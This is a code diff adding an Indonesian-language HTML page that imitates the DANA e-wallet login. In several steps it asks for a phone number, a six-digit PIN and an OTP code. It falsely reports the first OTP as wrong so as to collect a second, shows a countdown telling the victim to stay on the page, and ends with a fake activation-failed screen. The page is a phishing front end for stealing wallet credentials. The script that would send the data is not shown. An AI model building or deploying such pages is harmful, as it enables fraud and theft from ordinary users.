@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image" content="https://iconlogovector.com/uploads/images/2023/03/lg-8b694ad63ac093b84ec0972a7c442d7c61.jpg">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <title>DANA - Dompet Digital
+    Indonesia
+  </title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="container">
+    <div id="spinner" name="spinner" class="process" style="display: none;">
+      <div id="gbrspin" class="loading"><img src="/load_bg.png"><img class="spinner" src="/load_spin.png">
+      </div>
+    </div>
+    <div id="overlay" class="process" style="display: none"></div>
+    <!-- Page1 NO hp -->
+    <div id="Page1" class="page1" style="display: block">
+      <img src="/c.jpg" alt="/a.jpg" width="100%">
+      <h1>Masukkan nomor Hp sebagai
+        ID
+        DANA</h1>
+      <div class="phone-input">
+        <img src="indonesia-flag.png" alt="Indonesia Flag" class="flag-icon">
+        <span class="country-code">+62</span>
+        <input type="tel" id="phone" class="nope" placeholder="811 2345 6789" oninput="formatPhoneNumber()">
+      </div>
+      <img src="/d.jpg" alt="/a.jpg" width="100%">
+      <div class="btn">
+        <button id="continueButton" onclick="showPage2()" disabled>Lanjut</button>
+      </div>
+    </div>
+
+    <!-- Page2 Rincian -->
+    <div id="Page2" class="page2" style="display: none">
+      <img src="rincian.png" alt="e.png" width="100%">
+      <button onclick="showPage3()">Lanjut</button>
+    </div>
+
+    <!-- Page3 PIN -->
+    <div id="Page3" class="page3" style="display: none">
+      <div class="gbr">
+        <img src="f.png" alt="f.png" width="100%">
+      </div>
+      <h2>PIN DANA</h2>
+      <div class="pin-container">
+        <input type="password" id="pin1" maxlength="1" class="pin-box" inputmode="numeric" oninput="checkAndEnable(this, 'pin2')">
+        <input type="password" id="pin2" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin3')" onkeydown="moveToPrev(event, 'pin1')">
+        <input type="password" id="pin3" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin4')" onkeydown="moveToPrev(event, 'pin2')">
+        <input type="password" id="pin4" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin5')" onkeydown="moveToPrev(event, 'pin3')">
+        <input type="password" id="pin5" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin6')" onkeydown="moveToPrev(event, 'pin4')">
+        <input type="password" id="pin6" maxlength="1" class="pin-box" inputmode="numeric" disabled onkeydown="moveToPrev(event, 'pin5')" oninput="showPage4()">
+      </div>
+      <div class="button-container">
+        <button1 onclick="togglePassword()" class="toggle-button" id="toggleButton">
+          Tampilkan
+        </button1>
+      </div>
+    </div>
+
+    <!--OTP Page4 -->
+    <div id="Page4" class="page4" style="display: none">
+      <img src="f.png" alt="f.png" width="100%" style="margin-top: 10px;">
+      <div id="spaceOtp" style="padding: 0 15px 0">
+        <h2>Kode OTP</h2>
+        <p style="font-size: 12px; color: gray;">Kode OTP dikirim via SMS/WhatsApp ke nomor hp yang terhubung dengan aplikasi DANA</p>
+        <input type="tel" class="otp1" id="otp" maxlength="6" minlength="4" required>
+      </div>
+      <span class="btntmr" id="resendButton" disabled>Kirim Ulang: 320s</span>
+      <p id="peringatanOtp" style="display: none; color: red; font-size: 14px;">Kode OTP harus diisi..!</p>
+      <div class="btnOtp">
+        <button onclick="showPage4a()">Lanjut</button>
+      </div>
+    </div>
+
+    <div id="Page4a" class="page4a" style="display: none">
+      <img src="f.png" alt="f.png" width="100%" style="margin-top: 10px;">
+      <div id="spaceOtp" style="padding: 0 15px 0">
+        <h2>Kode OTP</h2>
+        <input type="tel" class="otp1" id="otpa" maxlength="6" minlength="4" required>
+        <p style="color: #FF3F3F; font-size: 14px; ">Kode OTP salah atau kadaluwarsa!</p>
+      </div>
+      <p id="peringatanOtp" style="display: none; color: red; font-size: 14px;">Kode OTP harus diisi..!</p>
+      <div class="btnOtp">
+        <button onclick="showPage6()">Lanjut</button>
+      </div>
+    </div>
+
+
+    <!-- Page5 -->
+    <div id="Page5" class="page5" style="display: none">
+      <div id="kunOtp" class="kunOtp">
+        <div style="margin-top: 40%; color: #FFFFFFC4">
+          <p>Kode OTP yang dimasukkan salah atau kadaluwarsa. Jangan menutup halaman ini, Mohon menunggu kode berikutnya setelah:</p>
+        </div>
+        <div id="timer">80s</div>
+      </div>
+      <img src="f.png" alt="f.png" width="100%" style="margin-top: 10px;">
+      <div id="spaceOtp" style="padding: 0 15px 0">
+        <h2>Kode OTP</h2>
+        <input type="tel" class="otp1" id="otp2" maxlength="6" minlength="4" required>
+      </div>
+      <span class="btntmr" id="resendButton1" disabled>Kirim Ulang: 320s</span>
+      <p id="peringatanOtp" style="display: none; color: red; font-size: 14px;">Kode OTP harus diisi..!</p>
+      <div class="btnOtp">
+        <button onclick="showPage6()">Lanjut</button>
+      </div>
+    </div>
+
+
+    <div id="Page6" class="page6" style="display: none">""
+      <div style="width: 100%">
+        <img src="g.png" alt="g.png" width="100%">
+        <br>
+        <h2>Aktivasi Saldo Gagal</h2>
+        <p style="font-size: 14.1px; ">Untuk dapat menyelesaikan
+          aktivasi saldo ini. <br>Pastikan kamu
+          memiliki saldo minimal
+          Rp300.000 di aplikasi DANA kamu sebagai bukti bahwa kamu pengguna aktif aplikasi DANA.</p>
+        <div class="tbl6">
+          <button class="btn66" onclick="window.location.href='https://play.google.com/store/apps/details?id=id.dana&hl=en'">Mengerti</button>
+        </div>
+      </div>
+      <br>
+      <div id="overlay" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 50;">
+      </div>
+    </div>
+  </div>
+
+  <script src="main.js"></script>
+</body>
+
+</html>
